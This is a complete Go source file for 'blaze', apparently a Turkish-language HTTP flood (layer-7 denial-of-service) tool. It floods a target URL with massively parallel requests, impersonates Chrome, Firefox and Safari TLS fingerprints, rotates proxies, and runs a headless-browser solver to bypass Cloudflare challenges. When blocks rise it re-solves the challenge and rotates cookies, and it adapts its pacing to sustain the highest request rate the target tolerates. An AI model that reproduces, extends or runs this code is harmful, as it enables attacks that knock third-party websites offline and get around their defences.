package main

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	gofire "github.com/JSInvasor/Gohttp-clientfingerprintemulateandfastest"
)

// ANSI colors
const (
	white = "\033[37m"
	gray  = "\033[38;5;245m"
	red   = "\033[31m"
	reset = "\033[0m"
)

func main() {
	if len(os.Args) < 4 {
		fmt.Println("kullanim: blaze <url> <sure_sn> <thread> [stream] [method] [proxy|proxy_dosya] [--solve]")
		fmt.Println()
		fmt.Println("ornek:    ./blaze https://hedef.com 60 64 32")
		fmt.Println("ornek:    ./blaze https://hedef.com 60 40 40 GET --solve")
		os.Exit(1)
	}

	targetURL := os.Args[1]
	if !strings.HasPrefix(targetURL, "http://") && !strings.HasPrefix(targetURL, "https://") {
		targetURL = "https://" + targetURL
	}

	durSec := mustInt(os.Args[2], "sure")
	threads := mustInt(os.Args[3], "thread")

	streams := 32
	method := "GET"
	proxyArg := ""
	solve := false

	posArgs := []string{}
	for _, arg := range os.Args[4:] {
		if arg == "--solve" {
			solve = true
		} else {
			posArgs = append(posArgs, arg)
		}
	}
	if len(posArgs) >= 1 {
		streams = mustInt(posArgs[0], "stream")
	}
	if len(posArgs) >= 2 {
		method = strings.ToUpper(posArgs[1])
	}
	if len(posArgs) >= 3 {
		proxyArg = posArgs[2]
	}

	var solvedCookies string
	var solvedUA string
	if solve {
		var err error
		solvedCookies, solvedUA, err = solveCFChallenge(targetURL)
		if err != nil {
			fmt.Fprintf(os.Stderr, "%shata: challenge cozulemedi: %v%s\n", red, err, reset)
			os.Exit(1)
		}
	}

	run(targetURL, durSec, threads, streams, method, proxyArg, solvedCookies, solvedUA, solve)
}

type solverResult struct {
	Status    string `json:"status"`
	URL       string `json:"url"`
	UserAgent string `json:"user_agent"`
	Cookies   string `json:"cookies"`
	Error     string `json:"error"`
}

func solveCFChallenge(targetURL string) (cookies string, userAgent string, err error) {
	fmt.Printf("cloudflare challenge cozuluyor...\n")

	solverPath := findSolver()
	if solverPath == "" {
		return "", "", fmt.Errorf("solver/index.js bulunamadi")
	}
	if _, errStat := os.Stat("solver/node_modules"); os.IsNotExist(errStat) {
		return "", "", fmt.Errorf("solver/node_modules bulunamadi")
	}

	// 90s ceiling: human navigation + challenge solve can legitimately take
	// 30-60s on slower targets, especially when CF re-issues the challenge.
	ctx, cancel := context.WithTimeout(context.Background(), 90*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, "node", solverPath, targetURL, "75")
	cmd.Stderr = os.Stderr
	// Put node + every chromium child in their own process group so we can
	// kill the WHOLE tree on timeout. Without Setpgid, exec.CommandContext
	// only kills the immediate node process - chromium children survive as
	// orphans and keep eating CPU/RAM.
	cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
	// On context cancel, send SIGKILL to the entire process group (-pid).
	cmd.Cancel = func() error {
		if cmd.Process == nil {
			return nil
		}
		return syscall.Kill(-cmd.Process.Pid, syscall.SIGKILL)
	}
	cmd.WaitDelay = 5 * time.Second // grace window for graceful close after Cancel
	output, errCmd := cmd.Output()
	if errCmd != nil {
		return "", "", fmt.Errorf("solver calistirilamadi: %w", errCmd)
	}

	var result solverResult
	if errJSON := json.Unmarshal(output, &result); errJSON != nil {
		return "", "", fmt.Errorf("solver ciktisi okunamadi: %w", errJSON)
	}

	if result.Status == "error" {
		return "", "", fmt.Errorf("%s", result.Error)
	}
	if result.Cookies == "" {
		return "", "", fmt.Errorf("cookie yok (status: %s)", result.Status)
	}

	fmt.Printf("%schallenge cozuldu!%s\n", white, reset)
	return result.Cookies, result.UserAgent, nil
}

func findSolver() string {
	for _, p := range []string{"solver/index.js", "./solver/index.js"} {
		if _, err := os.Stat(p); err == nil {
			return p
		}
	}
	return ""
}

type clientGroup struct {
	name      string
	tag       string // Ch, FF, SF
	clients   []*gofire.Client
	pipelines []*gofire.Pipeline
	templates []*http.Request
}

func (cg *clientGroup) Close() {
	for _, p := range cg.pipelines {
		p.Close()
	}
	for _, c := range cg.clients {
		c.Close()
	}
}

func (cg *clientGroup) ActiveConnections() int64 {
	var total int64
	for _, c := range cg.clients {
		total += c.ActiveConnections()
	}
	return total
}

func (cg *clientGroup) updateCookies(newCookies string) {
	for i, tmpl := range cg.templates {
		// Clone the template and set new cookie - atomic swap, no race.
		newTmpl := tmpl.Clone(tmpl.Context())
		newTmpl.Header.Set("Cookie", newCookies)
		cg.templates[i] = newTmpl
		cg.pipelines[i].SetTemplate(newTmpl)
	}
}

// browserLabel maps tag to full display name
var browserLabel = map[string]string{
	"Ch": "Chrome 147",
	"FF": "Firefox 150",
	"SF": "Safari iOS 18",
}

// formatTestResult returns the impersonate line for a browser test.
func formatTestResult(tag string, statusCode int, err error) string {
	label := browserLabel[tag]
	if label == "" {
		label = tag
	}

	if err != nil {
		errMsg := err.Error()
		var reason string
		switch {
		case strings.Contains(errMsg, "tls handshake") || strings.Contains(errMsg, "handshake"):
			reason = "tls handshake failed"
		case strings.Contains(errMsg, "timeout") || strings.Contains(errMsg, "Timeout"):
			reason = "timeout"
		case strings.Contains(errMsg, "connection refused"):
			reason = "connection refused"
		default:
			reason = errMsg
			if len(reason) > 80 {
				reason = reason[:80]
			}
		}
		return fmt.Sprintf("%sImpersonate %s %s>%s %s%s%s", white, label, gray, reset, red, reason, reset)
	}
	return fmt.Sprintf("%sImpersonate %s %s>%s %s%d%s", white, label, gray, reset, white, statusCode, reset)
}

func run(targetURL string, durSec, threads, streams int, method, proxyArg, solvedCookies, solvedUA string, solveEnabled bool) {
	runtime.GOMAXPROCS(runtime.NumCPU())

	// No artificial cap — use thread count directly so the VPS decides the ceiling.
	totalTargetClients := threads
	if totalTargetClients < 1 {
		totalTargetClients = 1
	}

	// Scale connection pools with workload. 0 = unlimited active connections.
	idlePerHost := threads * streams
	if idlePerHost < 256 {
		idlePerHost = 256
	}

	baseOpts := []gofire.Option{
		gofire.WithTimeout(10 * time.Second),
		gofire.WithTLSHandshakeTimeout(8 * time.Second),
		gofire.WithDialTimeout(8 * time.Second),
		gofire.WithMaxIdleConnsPerHost(idlePerHost),
		gofire.WithMaxIdleConns(0),
		gofire.WithMaxConnsPerHost(0),
		gofire.WithDNSCacheTTL(30 * time.Minute),
		gofire.WithIdleConnTimeout(120 * time.Second),
		gofire.WithMaxRedirects(3),
		gofire.WithWriteBufferSize(128 * 1024),
		gofire.WithReadBufferSize(128 * 1024),
	}

	browserReferers := map[string]string{
		"safari":  "https://www.google.com/search?client=safari&channel=iphone_bm",
		"chrome":  "https://www.google.com/",
		"firefox": "https://duckduckgo.com/",
	}

	var proxyRotator *gofire.ProxyRotator
	if proxyArg != "" {
		if isProxyFile(proxyArg) {
			var err error
			proxyRotator, err = gofire.NewProxyRotatorFromFile(proxyArg)
			if err != nil {
				fmt.Fprintf(os.Stderr, "%shata: proxy dosyasi yuklenemedi: %v%s\n", red, err, reset)
				os.Exit(1)
			}
		} else {
			baseOpts = append(baseOpts, gofire.WithProxy(proxyArg))
		}
	}

	var parsedCookies []*http.Cookie
	if solvedCookies != "" {
		parsedCookies = parseCookieHeader(solvedCookies)
	}

	type browserSpec struct {
		name    string
		tag     string // Ch, FF, SF
		profile gofire.BrowserProfile
		clients int
	}

	var browsers []browserSpec

	if solvedCookies != "" {
		browsers = []browserSpec{
			{"chrome", "Ch", gofire.Chrome147, totalTargetClients},
		}
		if solvedUA != "" {
			baseOpts = append(baseOpts, gofire.WithUserAgent(solvedUA))
		}
	} else {
		safariClients := totalTargetClients * 4 / 10
		chromeClients := totalTargetClients * 3 / 10
		firefoxClients := totalTargetClients - safariClients - chromeClients
		if safariClients < 2 {
			safariClients = 2
		}
		if chromeClients < 1 {
			chromeClients = 1
		}
		if firefoxClients < 1 {
			firefoxClients = 1
		}
		browsers = []browserSpec{
			{"firefox", "FF", gofire.Firefox150, firefoxClients},
			{"chrome", "Ch", gofire.Chrome147, chromeClients},
			{"safari", "SF", gofire.SafariIOS18, safariClients},
		}
	}

	groups := make([]*clientGroup, len(browsers))

	totalClients := 0
	for _, bs := range browsers {
		totalClients += bs.clients
	}
	workersPerClient := (threads * streams) / totalClients
	if workersPerClient < 1 {
		workersPerClient = 1
	}

	for bi, bs := range browsers {
		cg := &clientGroup{name: bs.name, tag: bs.tag}
		opts := append(baseOpts, gofire.WithReferer(browserReferers[bs.name]))

		for i := 0; i < bs.clients; i++ {
			c, err := gofire.Emulate(bs.profile, opts...)
			if err != nil {
				fmt.Fprintf(os.Stderr, "%shata: %s client olusturulamadi: %v%s\n", red, bs.name, err, reset)
				os.Exit(1)
			}
			if proxyRotator != nil {
				c.SetProxyRotator(proxyRotator)
			}
			if len(parsedCookies) > 0 {
				_ = c.SetCookies(targetURL, parsedCookies)
			}
			tmpl, err := c.PrepareRequest(method, targetURL)
			if err != nil {
				fmt.Fprintf(os.Stderr, "%shata: template olusturulamadi: %v%s\n", red, err, reset)
				os.Exit(1)
			}
			if solvedCookies != "" {
				tmpl.Header.Set("Cookie", solvedCookies)
			}
			p := c.NewPipeline(workersPerClient)
			p.SetTemplate(tmpl)
			cg.clients = append(cg.clients, c)
			cg.pipelines = append(cg.pipelines, p)
			cg.templates = append(cg.templates, tmpl)
		}
		groups[bi] = cg
	}
	defer func() {
		for _, cg := range groups {
			cg.Close()
		}
	}()

	// Test one client per browser - clean output
	for _, cg := range groups {
		testCtx, testCancel := context.WithTimeout(context.Background(), 15*time.Second)
		resp, testErr := cg.clients[0].DoWithContext(testCtx, method, targetURL, nil, nil)
		testCancel()
		if testErr != nil {
			fmt.Println(formatTestResult(cg.tag, 0, testErr))
		} else {
			fmt.Println(formatTestResult(cg.tag, resp.StatusCode(), nil))
			resp.Close()
		}
	}

	// Pre-warm: scale connection count with worker count so the first wave of
	// requests doesn't trigger a thundering herd of dials. CF MAX_CONCURRENT_STREAMS
	// is typically 100, so we need ceil(workersPerClient/80) conns minimum.
	preconnectN := workersPerClient / 80
	if preconnectN < 8 {
		preconnectN = 8
	}
	if preconnectN > 64 {
		preconnectN = 64
	}
	warmCtx, warmCancel := context.WithTimeout(context.Background(), 15*time.Second)
	for _, cg := range groups {
		for _, c := range cg.clients {
			_ = c.PreConnect(warmCtx, targetURL, preconnectN)
		}
	}
	warmCancel()

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(durSec)*time.Second)
	defer cancel()

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigCh
		cancel()
	}()

	var (
		totalSent   atomic.Int64
		totalFailed atomic.Int64
		errMu       sync.Mutex
		recentErrs  []string
		errCountMap sync.Map
		refreshing  atomic.Bool

		// Status histogram counters (lifetime totals).
		stat2xx     atomic.Int64
		stat3xx     atomic.Int64
		stat403     atomic.Int64
		stat429     atomic.Int64
		stat4xx     atomic.Int64 // 4xx excluding 403/429
		stat5xx     atomic.Int64
		statTimeout atomic.Int64
		statTLSErr  atomic.Int64
		statOther   atomic.Int64

		// Adaptive feeder pacing: feeders compare their index against
		// activeFeeders.Load() to decide whether to fire or sleep. The pacer
		// goroutine adjusts activeFeeders based on the recent bad-status rate.
		activeFeeders atomic.Int32
	)

	classify := func(err error, status int) string {
		if err != nil {
			es := err.Error()
			switch {
			case strings.Contains(es, "context canceled"):
				return "" // ignore — shutdown
			case strings.Contains(es, "context deadline exceeded") || strings.Contains(es, "Timeout") || strings.Contains(es, "timeout"):
				statTimeout.Add(1)
				return "timeout"
			case strings.Contains(es, "tls") || strings.Contains(es, "TLS") || strings.Contains(es, "handshake"):
				statTLSErr.Add(1)
				return "tls_err"
			default:
				statOther.Add(1)
				return "other"
			}
		}
		switch {
		case status == 403:
			stat403.Add(1)
			return "403"
		case status == 429:
			stat429.Add(1)
			return "429"
		case status >= 200 && status < 300:
			stat2xx.Add(1)
			return "2xx"
		case status >= 300 && status < 400:
			stat3xx.Add(1)
			return "3xx"
		case status >= 400 && status < 500:
			stat4xx.Add(1)
			return "4xx"
		case status >= 500:
			stat5xx.Add(1)
			return "5xx"
		}
		statOther.Add(1)
		return "other"
	}

	onResult := func(resp *gofire.Response, err error, latency time.Duration) {
		totalSent.Add(1)
		if err != nil {
			totalFailed.Add(1)
			errStr := err.Error()
			if strings.Contains(errStr, "context canceled") {
				_ = classify(err, 0)
				return
			}
			_ = classify(err, 0)
			if len(errStr) > 200 {
				errStr = errStr[:200]
			}
			if _, loaded := errCountMap.LoadOrStore(errStr, &atomic.Int64{}); !loaded {
				errMu.Lock()
				if len(recentErrs) < 10 {
					recentErrs = append(recentErrs, errStr)
				}
				errMu.Unlock()
			}
			if val, ok := errCountMap.Load(errStr); ok {
				val.(*atomic.Int64).Add(1)
			}
			return
		}
		if resp != nil {
			_ = classify(nil, resp.StatusCode())
		}
	}

	for _, cg := range groups {
		for _, p := range cg.pipelines {
			p.OnResult = onResult
		}
	}

	// Scale feeders with worker count so the job channel never starves.
	feedersPerPipeline := workersPerClient / 8
	if feedersPerPipeline < 4 {
		feedersPerPipeline = 4
	}

	totalPipelines := 0
	for _, cg := range groups {
		totalPipelines += len(cg.pipelines)
	}
	totalFeeders := int32(feedersPerPipeline * totalPipelines)
	activeFeeders.Store(totalFeeders)
	minActive := totalFeeders / 8
	if minActive < int32(totalPipelines) {
		minActive = int32(totalPipelines)
	}

	var feedWg sync.WaitGroup
	feedPipeline := func(pipeline *gofire.Pipeline, feederIdx int32) {
		defer feedWg.Done()
		for {
			select {
			case <-ctx.Done():
				return
			default:
			}
			// Adaptive throttle: if we've been deactivated, sleep briefly and
			// re-check. This is cheaper than synchronizing on a channel and
			// lets the pacer reactivate us within ~50ms.
			if feederIdx >= activeFeeders.Load() {
				select {
				case <-ctx.Done():
					return
				case <-time.After(50 * time.Millisecond):
				}
				continue
			}
			// Per-request timeout: 8s child ctx so a slow CF challenge HTML
			// doesn't park a worker for the rest of the run.
			rctx, rcancel := context.WithTimeout(ctx, 8*time.Second)
			pipeline.FireAndForget(rctx, method, targetURL, nil, nil)
			rcancel()
		}
	}

	var feederCounter int32
	for _, cg := range groups {
		for _, p := range cg.pipelines {
			for i := 0; i < feedersPerPipeline; i++ {
				idx := feederCounter
				feederCounter++
				feedWg.Add(1)
				go feedPipeline(p, idx)
			}
		}
	}

	// Adaptive pacer: every 2s, look at the last window's bad-status rate
	// (403+429+timeout+5xx) and adjust active feeder count. Goal: maximize
	// sustainable RPS by backing off when the target starts pushing back.
	go func() {
		ticker := time.NewTicker(2 * time.Second)
		defer ticker.Stop()
		var (
			last2xx, last403, last429, last4xx, last5xx int64
			lastTimeout, lastTLSErr, lastOther          int64
		)
		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				n2xx := stat2xx.Load()
				n403 := stat403.Load()
				n429 := stat429.Load()
				n4xx := stat4xx.Load()
				n5xx := stat5xx.Load()
				nTO := statTimeout.Load()
				nTLS := statTLSErr.Load()
				nOther := statOther.Load()

				d2xx := n2xx - last2xx
				d403 := n403 - last403
				d429 := n429 - last429
				d4xx := n4xx - last4xx
				d5xx := n5xx - last5xx
				dTO := nTO - lastTimeout
				dTLS := nTLS - lastTLSErr
				dOther := nOther - lastOther

				last2xx, last403, last429 = n2xx, n403, n429
				last4xx, last5xx = n4xx, n5xx
				lastTimeout, lastTLSErr, lastOther = nTO, nTLS, nOther

				windowTotal := d2xx + d403 + d429 + d4xx + d5xx + dTO + dTLS + dOther
				if windowTotal < 50 {
					continue
				}
				bad := d403 + d429 + d5xx + dTO + dTLS
				badRate := float64(bad) / float64(windowTotal)

				cur := activeFeeders.Load()
				switch {
				case badRate >= 0.50:
					// Heavy pushback: halve feeders.
					next := cur / 2
					if next < minActive {
						next = minActive
					}
					if next != cur {
						activeFeeders.Store(next)
					}
				case badRate >= 0.20:
					// Moderate: shave 25%.
					next := cur - cur/4
					if next < minActive {
						next = minActive
					}
					if next != cur {
						activeFeeders.Store(next)
					}
				case badRate < 0.05:
					// Calm: ramp back up by 25% (additive to avoid flapping).
					next := cur + totalFeeders/4
					if next > totalFeeders {
						next = totalFeeders
					}
					if next != cur {
						activeFeeders.Store(next)
					}
				}
			}
		}
	}()

	// Auto-refresh: when 403 rate spikes, re-solve and rotate cookies.
	if solveEnabled {
		go func() {
			ticker := time.NewTicker(5 * time.Second)
			defer ticker.Stop()
			var last2xx, last403 int64
			for {
				select {
				case <-ctx.Done():
					return
				case <-ticker.C:
					n2xx := stat2xx.Load()
					n403 := stat403.Load()
					d2xx := n2xx - last2xx
					d403 := n403 - last403
					last2xx, last403 = n2xx, n403

					total := d2xx + d403
					if total < 50 {
						continue
					}
					rate := float64(d403) / float64(total)
					if rate < 0.80 {
						continue
					}
					if !refreshing.CompareAndSwap(false, true) {
						continue
					}

					newCookies, _, errSolve := solveCFChallenge(targetURL)
					if errSolve != nil {
						refreshing.Store(false)
						continue
					}
					for _, cg := range groups {
						cg.updateCookies(newCookies)
					}
					refreshing.Store(false)
				}
			}
		}()
	}

	// RPS stats with status histogram. We print percentages over the lifetime
	// total because per-second deltas are noisy at very high RPS, and the
	// adaptive pacer already operates on a 2s window.
	startTime := time.Now()
	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		var lastSent int64
		var peakRPS int64

		pct := func(v, total int64) float64 {
			if total == 0 {
				return 0
			}
			return float64(v) * 100 / float64(total)
		}

		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				sent := totalSent.Load()
				elapsed := time.Since(startTime).Seconds()
				rps := sent - lastSent
				lastSent = sent
				if rps > peakRPS {
					peakRPS = rps
				}

				n2xx := stat2xx.Load()
				n403 := stat403.Load()
				n429 := stat429.Load()
				n5xx := stat5xx.Load()
				nTO := statTimeout.Load()
				active := activeFeeders.Load()

				fmt.Printf("\r%ssent:%d rps:%d peak:%d  2xx:%.0f%% 403:%.0f%% 429:%.0f%% 5xx:%.0f%% to:%.0f%%  pace:%d/%d  %.0fs%s   ",
					white, sent, rps, peakRPS,
					pct(n2xx, sent), pct(n403, sent), pct(n429, sent),
					pct(n5xx, sent), pct(nTO, sent),
					active, totalFeeders, elapsed, reset)
			}
		}
	}()

	feedWg.Wait()
	fmt.Println()

	// Final histogram summary on shutdown.
	totalSentFinal := totalSent.Load()
	if totalSentFinal > 0 {
		pctF := func(v int64) float64 {
			return float64(v) * 100 / float64(totalSentFinal)
		}
		fmt.Printf("%stotal:%d  2xx:%d (%.1f%%)  3xx:%d  403:%d (%.1f%%)  429:%d (%.1f%%)  4xx:%d  5xx:%d (%.1f%%)  timeout:%d  tls_err:%d  other:%d%s\n",
			white,
			totalSentFinal,
			stat2xx.Load(), pctF(stat2xx.Load()),
			stat3xx.Load(),
			stat403.Load(), pctF(stat403.Load()),
			stat429.Load(), pctF(stat429.Load()),
			stat4xx.Load(),
			stat5xx.Load(), pctF(stat5xx.Load()),
			statTimeout.Load(),
			statTLSErr.Load(),
			statOther.Load(),
			reset)
	}

	// Only show errors on stop
	errMu.Lock()
	if len(recentErrs) > 0 {
		fmt.Println()
		for _, e := range recentErrs {
			count := int64(0)
			if val, ok := errCountMap.Load(e); ok {
				count = val.(*atomic.Int64).Load()
			}
			fmt.Printf("%s[%dx] %s%s\n", red, count, e, reset)
		}
	}
	errMu.Unlock()
}

func parseCookieHeader(raw string) []*http.Cookie {
	header := http.Header{}
	header.Add("Cookie", raw)
	req := http.Request{Header: header}
	return req.Cookies()
}

func isProxyFile(s string) bool {
	if strings.Contains(s, "://") {
		return false
	}
	if _, err := os.Stat(s); err == nil {
		return true
	}
	return strings.HasSuffix(s, ".txt") || strings.HasSuffix(s, ".list") || strings.HasSuffix(s, ".csv")
}

func mustInt(s, name string) int {
	v, err := strconv.Atoi(s)
	if err != nil || v <= 0 {
		fmt.Fprintf(os.Stderr, "%shata: gecersiz %s: %s%s\n", red, name, s, reset)
		os.Exit(1)
	}
	return v
}
